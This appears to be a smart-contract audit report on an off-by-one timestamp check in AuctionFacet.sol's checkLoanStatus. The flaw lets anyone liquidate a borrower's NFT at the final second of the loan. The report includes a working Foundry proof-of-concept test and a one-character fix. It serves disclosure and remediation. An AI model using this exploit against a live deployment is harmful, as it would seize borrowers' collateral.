# Liquidator can liqudate NFT during loan duration time.

## Summary
SC: AuctionFacet.sol
Due to the unappropriated check of loan status, especially `endDate` variable, there is opportunity to liquidate loan at the last second(block) of loan duration. After overview of whole project there is no doubt, that main volume of borrow/repay process will be done by scripts.
To pay exactly at last time of loan duration is cost-effective and valuable for borrower. So if user set in script paydate = last time of loan duration, he can be liquidated by anyone. If loan duration 10 sec , at 10th second(not after) there is opportunity to liq.

## Vulnerability Detail
Core of vulnerability lies at `AuctionFacet.sol` function `checkLoanStatus`.
There is `<` shoud be replaced by `<=`.

```soldiity
    function checkLoanStatus(uint256 loanId) internal view {
        Loan storage loan = protocolStorage().loan[loanId];

        if (block.timestamp < loan.endDate) { // `<` shoud be replaced by `<=`
            revert CollateralIsNotLiquidableYet(loan.endDate, loanId);
        }
        if (loan.payment.paid != 0 || loan.payment.liquidated) {
            revert LoanAlreadyRepaid(loanId);
        }
    }
```
Now let's look at test:

Test code:
```soldiity
function testLiquidateInLastBlockOfDuration() public {

        deal({token: address(money), to: BORROWER, give: 100e18}); //mint ERC20
        deal({token: address(money), to: signer, give: 100e18}); //mint ERC20
        deal({token: address(money), to: signer2, give: 100e18}); //mint ERC20
        
        getJpeg(BORROWER, nft); //mint NFT to Borrower; aproved there too
        vm.prank(signer);
        money.approve(address(kairos),1e18);

        //===Let's check all balances before any action.
        console.log("ERC20 borrower balance:                    ", money.balanceOf(BORROWER));
        console.log("ERC20 SIGNER   balance:                    ", money.balanceOf(signer));
        console.log("ERC20 SIGNER2  balance:                    ", money.balanceOf(signer2));
        console.log("NFT   borrower balance:                    ", nft.balanceOf(BORROWER));
        console.log("Timestamp before borrow:                   ", block.timestamp);
        uint256 timestampBeforeBorrow = block.timestamp; //for console.log purpose

        //Now let's prepare arg's for borrow() function
        NFToken memory nftStruct;
        nftStruct = NFToken({implem: nft, id: 1});
        OfferArg[] memory offerArgs = new OfferArg[](1);
        Offer memory offer;
        offer =  Offer({
                assetToLend: money,
                loanToValue: 1e18,
                duration: 10,  // let's set duration for 10 second.
                expirationDate: block.timestamp+100,
                tranche: 0,
                collateral: nftStruct
                });
        
        offerArgs[0] = OfferArg({
                signature: getSignature(offer),
                amount: 1e18,
                offer: offer
                });
        BorrowArg[] memory borrowArgs = new BorrowArg[](1);
        borrowArgs[0] = BorrowArg({nft: NFToken({id: 1, implem: nft}), args: offerArgs});
        
        //Start borrow
        vm.startPrank(BORROWER);
        kairos.borrow(borrowArgs);
        console.log("Timestamp after borrow:                    ", block.timestamp);
        vm.stopPrank();

        //Let's prepare arg's for buy() for liquidation process on behalf of signer2
        vm.startPrank(signer2);
        money.approve(address(kairos),100000000000000000000); 

        vm.warp(block.timestamp+offerArgs[0].offer.duration); //Let's warp time at the last second of loan duration.
        BuyArg[] memory buyArgum = new BuyArg[](1); 
        uint256[] memory loanId = new uint256[](1); 
        loanId[0] = 1;
        buyArgum[0] = BuyArg({
                        loanId:1,
                        to: signer2
                        });
        kairos.buy(buyArgum); //Signer2 will successfuly liquidate NFT in duration time. 

        console.log("ERC20 borrower balance after liquidate:    ", money.balanceOf(BORROWER));
        console.log("ERC20 SIGNER   balance after liquidate:    ", money.balanceOf(signer));
        console.log("ERC20 SIGNER2  balance after liquidate:    ", money.balanceOf(signer2));
        console.log("NFT borrower balance after liquidate:      ", nft.balanceOf(BORROWER));
        console.log("Signer2 balance after liquidate:           ", nft.balanceOf(signer2));
        console.log("Timestamp after liquidate after liquidate: ", block.timestamp);
        console.log("=================================================================");
        console.log("Loan duration                              ", offerArgs[0].offer.duration);
        console.log("Actual diff between liquidate and borrow   ", block.timestamp-timestampBeforeBorrow);
    }
```

## Impact
User can lost their NFT.

## Tool used
Manual Review

## Recommendation
Replace `<`  by `<=`. in `checkLoanStatus()`.

```soldiity
    function checkLoanStatus(uint256 loanId) internal view {
        Loan storage loan = protocolStorage().loan[loanId];

        if (block.timestamp <= loan.endDate) { // `<` shoud be replaced by `<=`
            revert CollateralIsNotLiquidableYet(loan.endDate, loanId);
        }
        if (loan.payment.paid != 0 || loan.payment.liquidated) {
            revert LoanAlreadyRepaid(loanId);
        }
    }
```
In such case there no option to liquidate during loan duration.
